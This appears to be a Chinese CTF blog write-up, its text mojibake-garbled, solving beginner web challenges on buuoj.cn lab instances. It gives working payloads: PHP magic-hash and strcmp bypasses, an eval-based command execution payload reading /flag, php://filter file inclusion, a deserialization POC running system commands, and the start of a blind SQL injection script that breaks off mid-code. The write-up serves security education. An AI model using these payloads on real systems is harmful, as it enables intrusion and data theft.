HTTP</h5><p><a href="http://node4.buuoj.cn:29356/?ctf=1">http://node4.buuoj.cn:29356/?ctf=1</a><br>base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk<br>æ”¹ä¸€ä¸‹cookie</p><p><img src="/images/xinshengsai/20231011113506.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-ErrorFlask"><a href="#WEEK1-WEB-ErrorFlask" class="headerlink" title="WEEK1|WEB ErrorFlask"></a>WEEK1|WEB ErrorFlask</h5><p><a href="http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=">http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=</a>49&amp;number2=2<br>éšä¾¿ä¼ ä¸ªå‚æ•°ï¼Œæºç æ³„éœ²<br><img src="/images/xinshengsai/20231011113732.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-PHP"><a href="#WEEK1-WEB-Begin-of-PHP" class="headerlink" title="WEEK1|WEB Begin of PHP"></a>WEEK1|WEB Begin of PHP</h5><p>ä»£ç å¾ˆé•¿ï¼Œéƒ½æ˜¯åŸºç¡€çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>])Â &amp;&amp;Â <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 1=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]Â !==Â <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]Â &amp;&amp;Â md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>])Â ==Â md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;Â Â Â Â Â Â Â Â <span class="variable">$flag1Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 1&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 2=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>])Â ===Â sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag2Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 2&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 3=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],file_get_contents(<span class="string">&quot;/flag&quot;</span>))Â ==Â <span class="number">0</span>)&#123;Â Â <span class="comment">//ç”¨[]ç»•è¿‡strcmp</span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag3Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 3&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 4=&lt;br&gt;&quot;</span>;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>])Â &amp;&amp;Â <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]Â &gt;Â <span class="number">2023</span>)&#123;Â Â Â Â Â Â Â Â Â Â Â Â <span class="variable">$flag4Â </span>=Â <span class="literal">True</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 4&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;=LevelÂ 5=&lt;br&gt;&quot;</span>;Â Â Â Â extract(<span class="variable">$_POST</span>);  </span><br><span class="line">Â Â Â Â <span class="keyword">foreach</span>(<span class="variable">$_POSTÂ as</span>Â <span class="variable">$var</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 5&quot;</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â file_get_contents(<span class="string">&quot;/flag&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope,thisÂ isÂ levelÂ 5&quot;</span>);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line">http:<span class="comment">//e9f2544c-4f0e-400c-b5d2-0aa335160abb.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=240610708&amp;key4[]=1&amp;key5=2222c</span></span><br><span class="line">post:key3[]=<span class="number">1</span>&amp;flag5=%CE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-WEB-R-C-E"><a href="#WEEK1-WEB-R-C-E" class="headerlink" title="WEEK1|WEB R!C!E!"></a>WEEK1|WEB R!C!E!</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;Â Â Â Â <span class="variable">$password</span>=md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);Â Â Â Â <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(substr(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">eval</span>(<span class="variable">$code</span>);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªå°å¯†ç ï¼Œç”¨pythonçˆ†ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">Â  Â  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">Â  Â  Â  Â  t1 = Â <span class="built_in">str</span>(i)</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#t1 = Â &#x27;XIPU&#x27; Â str(i)+</span></span><br><span class="line">Â  Â  Â  Â  md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#print(md5_result)</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> md5_result[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># j = md5_result[10:24]</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment">#isdigit()åˆ¤æ–­æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œæ˜¯åˆ™ä¸ºtrue åä¹‹false</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="comment"># if j.isdigit():</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line">mohu_md5()</span><br><span class="line"></span><br><span class="line"><span class="comment">#114514-----&gt;c4d038b4bed09fdb1471ef51ec3a32cd</span></span><br></pre></td></tr></table></figure><p>$_POST[â€˜e_v.a.lâ€™]))è¿™ä¸ªevalä¼ å‚çš„æ—¶å€™ï¼Œè¦æŠŠ<code>_</code>æ¢æˆ<code>[</code>,<br>post:<br><code>password=114514&amp;e[v.a.l=eval($_POST[&#39;a&#39;]);&amp;a=system(&#39;cat /flag&#39;);</code></p><h5 id="WEEK1-WEB-EasyLogin"><a href="#WEEK1-WEB-EasyLogin" class="headerlink" title="WEEK1|WEB EasyLogin"></a>WEEK1|WEB EasyLogin</h5><p>adminçˆ†ç ´å³å¯ï¼ŒåŠ ä¸€ä¸‹md5<br><img src="/images/xinshengsai/20231011160139.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ"><a href="#WEEK2-WEB-å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ" class="headerlink" title="WEEK2|WEB å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ"></a>WEEK2|WEB å¬è¯´ä½ æ˜¯æ¸¸æˆé«˜æ‰‹ï¼Ÿ</h5><p>çœ‹ä¸€ä¸‹æºç ï¼Œå¤§äº100000000å³å¯ï¼Œjsonä¼ å‚</p><p><img src="/images/xinshengsai/20231009210734.png" alt="image-20220126203415648"><img src="/images/xinshengsai/20231009210939.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-include-0ã€‚0"><a href="#WEEK2-WEB-include-0ã€‚0" class="headerlink" title="WEEK2|WEB include 0ã€‚0"></a>WEEK2|WEB include 0ã€‚0</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   highlight_file(<span class="keyword">__FILE__</span>);   <span class="comment">//Â FLAGÂ inÂ theÂ flag.php   </span></span><br><span class="line"><span class="variable">$fileÂ </span>=Â <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>)Â &amp;&amp;Â !preg_match(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;   Â Â Â Â @<span class="keyword">include</span>(<span class="variable">$file</span>);   &#125;<span class="keyword">else</span>&#123;   Â Â Â Â <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);   &#125;   <span class="meta">?&gt;</span></span><br><span class="line">nope</span><br></pre></td></tr></table></figure><p>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿‡æ»¤äº†base  rotï¼Œå¯ä»¥ç”¨å…¶ä»–åè®®<br><a href="http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php">http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</a><br>å¾—åˆ°çš„ä¸œè¥¿å†è½¬å›å»å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&lt;hp p//lfga4&#123;2eb4dc-ece724-61-56a454-2c408bdd68&#125;a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&#x27;UCS-2BE&#x27;</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-Unserializeï¼Ÿ"><a href="#WEEK2-WEB-Unserializeï¼Ÿ" class="headerlink" title="WEEK2|WEB Unserializeï¼Ÿ"></a>WEEK2|WEB Unserializeï¼Ÿ</h5><p>ååºåˆ—åŒ–ï¼Œprivateå˜é‡è¢«åºåˆ—åŒ–æ—¶ä¼šäº§ç”Ÿ\x00ï¼Œè¦æ³¨æ„urlç¼–ç <br>è¿‡æ»¤äº†å¸¸ç”¨æŸ¥çœ‹å‘½ä»¤ç”¨nl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">//Â MaybeÂ youÂ needÂ learnÂ someÂ knowledgeÂ aboutÂ deserialize?  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span>Â <span class="title">evil</span>Â </span>&#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">private</span>Â <span class="variable">$cmd</span>;  </span><br><span class="line">  </span><br><span class="line">Â Â Â Â <span class="keyword">public</span>Â <span class="function"><span class="keyword">function</span>Â <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>,Â <span class="keyword">$this</span>-&gt;cmd))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â @system(<span class="keyword">$this</span>-&gt;cmd);  </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Â  Â  </span>&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  @system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">Â  Â  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> evil();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-ez-sql"><a href="#WEEK2-WEB-ez-sql" class="headerlink" title="WEEK2|WEB ez_sql"></a>WEEK2|WEB ez_sql</h5><p>sqlæ³¨å…¥ï¼Œç›²æ³¨<br>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sql_char = [<span class="string">&#x27;select&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;union&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;and&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;or&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;sleep&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;where&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;from&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;limit&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;group&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;by&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;like&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;prepare&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;as&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;if&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;char&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;ascii&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;mid&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;left&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;substring&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;handler&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;updatexml&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;extractvalue&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;benchmark&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;insert&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;update&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;--&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="string">&#x27; &#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> sql_char:</span><br><span class="line"></span><br><span class="line">Â  Â  res = requests.get(<span 